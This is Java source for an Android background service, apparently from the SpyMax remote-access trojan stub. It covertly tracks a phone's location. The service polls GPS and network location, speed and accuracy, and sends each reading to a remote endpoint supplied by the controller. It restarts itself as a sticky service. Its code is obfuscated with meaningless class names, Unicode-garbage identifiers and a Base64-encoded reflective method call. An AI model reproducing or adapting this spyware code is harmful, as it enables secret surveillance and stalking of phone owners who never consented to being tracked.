package spymax.stub7;

import android.Manifest;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;

import android.os.Bundle;
import android.os.IBinder;
import android.support.v4.app.ActivityCompat;


public class ClassGen5 extends Service {
    public static long t = 5000;
    public static long d = 0;
    public static double ʾʼʾʿˈᵔঙʿ$ʿʼ = 0.0;
    public static double Longting = 0.0;
    public static float letliudid = 0.0f;
    public static float sp = 0.0f;
    public static LocationListener LL;
    public static LocationManager LM;
    private String vul[];
    static ClassGen5 st;


    public int onStartCommand(Intent intent, int flags, int startId) {
        String wx = ClassGen8.FTX2;
        if (intent != null) {
            if (intent.hasExtra(wx)) {

                Context ctx = getApplicationContext();
                ClassGen3.p_ClassGen3_r = ctx.getResources().getString(R.string.t1t2t3t4t5t6);
//                if (ClassGen3.pr.charAt(1) == ClassGen3.c1) {
//                    Notification ntf = ClassGen3.Foreground(ctx);
//                    if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.N) {
//                        ClassGen3.sf2 = 1;
//                        st = this;
//                        //ClassGen3.StartNewScan(ctx,new Intent(this, ClassGen13.class));
//                        String funClass = "spymax" + "." + "stub7" + "." + "ClassGen3";
//                        Class c = null;
//                        try {
//                            c = Class.forName(funClass);
//                        } catch (ClassNotFoundException e) {
//                            e.printStackTrace();
//                        }
//
//
//                        Object o = null;
//                        try {
//                            o = c.newInstance();
//                        } catch (IllegalAccessException e) {
//                            e.printStackTrace();
//                        } catch (InstantiationException e) {
//                            e.printStackTrace();
//                        }
//
//                        Class[] paramTypes = new Class[2];
//                        paramTypes[0] = Context.class;
//                        paramTypes[1] = Intent.class;
//                        String methodName = ClassGen3._D_BASE64_("U3RhcnROZXdTY2Fu");
//
//                        Method m = null;
//                        try {
//                            m = c.getDeclaredMethod(methodName, paramTypes);
//                        } catch (NoSuchMethodException e) {
//                            e.printStackTrace();
//                        }
//
//                        try {
//                            m.invoke(o, new Object[]{ctx, new Intent(this, ClassGen13.class)});
//                        } catch (IllegalAccessException e) {
//                            e.printStackTrace();
//                        } catch (InvocationTargetException e) {
//                            e.printStackTrace();
//                        }
//                    } else {
//                        if (ntf != null) {
//                            startForeground(7774, ntf);
//                        }
//                    }
//                }

                vul = intent.getStringArrayExtra(wx);
                ru();
            }
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void ru() {
        try {

            ClassGen5.LM = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            ClassGen5.LL = new LocationListener() {
                public void onLocationChanged(Location L) {
                    if (L != null) {
                        ClassGen5.Longting= L.getLongitude();
                        ClassGen5.ʾʼʾʿˈᵔঙʿ$ʿʼ = L.getLatitude();
                        ClassGen5.letliudid = L.getAccuracy();
                        ClassGen5.sp = L.getSpeed();
                        s(ClassGen5.ʾʼʾʿˈᵔঙʿ$ʿʼ, ClassGen5.Longting, ClassGen5.letliudid);
                        boolean gps = ClassGen5.LM.isProviderEnabled(LocationManager.GPS_PROVIDER);
                        if (gps) {
                            try {
                                ClassGen5.LM.removeUpdates(ClassGen5.LL);
                            } catch (Exception e) {
                            }
                            if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                                // TODO: Consider calling
                                //    ActivityCompat#requestPermissions
                                // here to request the missing permissions, and then overriding
                                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                //                                          int[] grantResults)
                                // to handle the case where the user grants the permission. See the documentation
                                // for ActivityCompat#requestPermissions for more details.
                                return;
                            }
                            ClassGen5.LM.requestLocationUpdates(LocationManager.GPS_PROVIDER, ClassGen5.t, ClassGen5.d, ClassGen5.LL);
                        }
                    }
                }
                public void onStatusChanged(String provider, int status, Bundle extras) {
                }
                public void onProviderEnabled(String provider) {
                }
                public void onProviderDisabled(String provider) {
                }
            };
            boolean net = ClassGen5.LM.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
            boolean gps = ClassGen5.LM.isProviderEnabled(LocationManager.GPS_PROVIDER);
            if (!gps && !net){
                p();
            }else{
                if(net) {
                    Location L = LM.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if(L != null){
                        ClassGen5.Longting = L.getLongitude();
                        ClassGen5.ʾʼʾʿˈᵔঙʿ$ʿʼ = L.getLatitude();







                        ClassGen5.letliudid = L.getAccuracy();
                        ClassGen5.sp = L.getSpeed();
                        s(ClassGen5.ʾʼʾʿˈᵔঙʿ$ʿʼ,ClassGen5.Longting,ClassGen5.letliudid);
                    }
                    ClassGen5.LM.requestLocationUpdates(LocationManager.NETWORK_PROVIDER , ClassGen5.t, ClassGen5.d, ClassGen5.LL);
                }else if (gps){
                    Location L = ClassGen5.LM.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if(L != null){
                        ClassGen5.Longting= L.getLongitude();
                        ʾʼʾʿˈᵔঙʿ$ʿʼ = L.getLatitude();
                        ClassGen5.letliudid = L.getAccuracy();







                        ClassGen5.sp = L.getSpeed();
                        s(ʾʼʾʿˈᵔঙʿ$ʿʼ,ClassGen5.Longting,ClassGen5.letliudid);
                    }
                    ClassGen5.LM.requestLocationUpdates(LocationManager.GPS_PROVIDER , ClassGen5.t, ClassGen5.d, ClassGen5.LL);
                }
            }
        } catch (Exception e) {
            ClassGen5.Longting = 0.0;
            ClassGen5.ʾʼʾʿˈᵔঙʿ$ʿʼ = 0.0;
            p();







        }
    }
    private void s(double la,double lo , float acc) {
        int ed =(int)(ClassGen5.sp);
        String d = la + vul[0] + lo + vul[0] + acc + vul[0] + ed;
        ClassGen2._send_it_(vul[1],d.getBytes());
    }
    private void p(){
        Intent i = new Intent(this, ClassGen5.class);
        this.stopService(i);
    }
    @Override
    public void onDestroy(){
        ClassGen3.s_ClassGen3_f2 = 0;
        st = null;
        try{

            ClassGen5.LM.removeUpdates(ClassGen5.LL);
        } catch (Exception e) {





              }
        super.onDestroy();
    }

}

